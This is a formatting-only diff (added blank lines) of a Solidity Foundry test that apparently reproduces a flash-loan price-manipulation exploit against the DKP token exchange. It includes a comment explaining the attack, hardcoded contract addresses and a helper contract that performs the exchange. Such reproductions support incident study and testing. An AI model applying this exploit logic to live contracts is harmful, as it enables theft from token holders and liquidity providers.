@@ -15,10 +15,13 @@ import "./../interface.sol";
 // and the attacker manipulates this price through flashLoan, swapping a very small amount of USDT for a large amount of DKP and selling it for a profit
 
 interface IDKPExchange {
+
     function exchange(uint256 amount) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);
@@ -75,9 +78,11 @@ contract ContractTest is Test {
         bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
         return address(uint160(uint256(hash)));
     }
+
 }
 
 contract ExchangeDKP {
+
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);
     IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);
@@ -87,4 +92,5 @@ contract ExchangeDKP {
         DKPExchange.exchange(100 * 1e18);
         DKP.transfer(msg.sender, DKP.balanceOf(address(this)));
     }
+
 }
